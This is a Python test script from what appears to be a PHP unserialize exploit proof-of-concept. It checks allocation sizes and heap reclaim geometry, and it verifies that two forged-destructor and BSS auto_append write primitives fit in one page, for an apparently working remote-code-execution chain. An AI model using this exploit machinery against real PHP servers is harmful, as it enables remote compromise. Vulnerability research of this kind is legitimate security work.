#!/usr/bin/env python3
"""Arithmetic verifier for pud_reclaim_class.py (offline; no lab needed).

Asserts the source-derived sizes/classes and cross-checks them against two
independently-established facts:
  - the gdb-observed invariant DT - d = 0x3000 (stale-globals layout notes);
  - the proven proc_seeded_rce carrier (--size 4071 -> 1-page `out`);
and that both d-reclaim forges (last_dtor_forge, bss_last_dtor_forge) write only
within the carrier's first page (so a 1-page carrier suffices).

    python3 -I poc/primitives/geometry/verify_pud_reclaim_class.py
"""
from __future__ import annotations

import os
import sys

_HERE = os.path.dirname(os.path.abspath(__file__))
_POC_ROOT = os.path.dirname(os.path.dirname(_HERE))  # poc/
if _POC_ROOT not in sys.path:
    sys.path.insert(0, _POC_ROOT)
from primitives.geometry import pud_reclaim_class as P  # noqa: E402
from primitives.write.last_dtor_forge import (  # noqa: E402
    forge_last_dtor_value, FD_BASE,
)
from primitives.write.bss_last_dtor_forge import forge_bss_autoappend  # noqa: E402


def check(name, cond):
    print(("  ok   " if cond else "  FAIL ") + name)
    return cond


def _nonfill_max(val, fill):
    nz = [i for i, b in enumerate(val) if b != fill]
    return max(nz) if nz else -1


def main():
    ok = True

    # --- source-derived sizes / classes ---
    ok &= check("sizeof(var_entries) == 8160", P.sizeof_var_entries() == 8160)
    ok &= check("sizeof(var_dtor_entries) == 4096", P.sizeof_var_dtor_entries() == 4096)
    ok &= check("sizeof(php_unserialize_data) == 8216", P.sizeof_php_unserialize_data() == 8216)
    ok &= check("d is LARGE (page-run), not a small bin", P.is_large(P.sizeof_php_unserialize_data()))
    ok &= check("pud_pages() == 3", P.pud_pages() == 3)
    ok &= check("vde_pages() == 1", P.vde_pages() == 1)

    # --- cross-check vs gdb-observed invariant ---
    ok &= check("DT - d == 0x3000 (matches gdb stale-globals layout)", P.dt_minus_d() == 0x3000)

    # --- cross-check vs proven proc_seeded_rce carrier ---
    ok &= check("proven carrier 4071 is viable (large, forge fits a page)",
                P.carrier_is_viable(P.PROVEN_VALUE_LEN))
    ok &= check("proven carrier 4071 -> 1 page", P.carrier_pages(P.PROVEN_VALUE_LEN) == 1)
    ok &= check("sub-3072 value NOT viable (would be a small bin)",
                not P.carrier_is_viable(2048))
    ok &= check("1-page window is (3072, 4095]", P.reclaim_value_len_window(1) == (3072, 4095))

    # --- both forges write only within the carrier's first page ---
    # last_dtor_forge: realistic near-targets so s1=s2=0 pass the asserts.
    a = 0x7f0000000000 + 0x6a000
    copy = a + 0x2000
    t1 = a + 40                              # k1=24, s1=0
    t2 = copy + 24 + FD_BASE + 16            # fd=FD_BASE, s2=0
    val = forge_last_dtor_value(P.PROVEN_VALUE_LEN, (a, copy, t1, t2), verbose=False)
    m = _nonfill_max(val, ord("G"))
    ok &= check(f"last_dtor_forge footprint {m:#x} < one page", 0 <= m < P.ZEND_MM_PAGE_SIZE)
    ok &= check("last_dtor_forge footprint <= FORGE_FOOTPRINT", m <= P.FORGE_FOOTPRINT)

    # bss_last_dtor_forge (its selftest offsets).
    off = {"core_globals_off": 0x16e1580,
           "error_prepend_off": 0x16e1580 + 0x98,
           "auto_append_off": 0x16e1580 + 0xa8,
           "input_encoding_off": 0x16e1580 + 0xb0}
    binbase = 0x5c1f11e00000
    carrier = 0x7f3a4ec00000 + 0x67000
    bval, _ = forge_bss_autoappend(P.PROVEN_VALUE_LEN, carrier, binbase, off, carrier + 0x1800)
    bm = _nonfill_max(bval, ord("C"))
    ok &= check(f"bss_last_dtor_forge footprint {bm:#x} < one page", 0 <= bm < P.ZEND_MM_PAGE_SIZE)
    ok &= check("bss_last_dtor_forge footprint <= FORGE_FOOTPRINT", bm <= P.FORGE_FOOTPRINT)

    print("\n==== verify_pud_reclaim_class: %s ====" % ("PASS" if ok else "FAIL"))
    return 0 if ok else 1


if __name__ == "__main__":
    raise SystemExit(main())
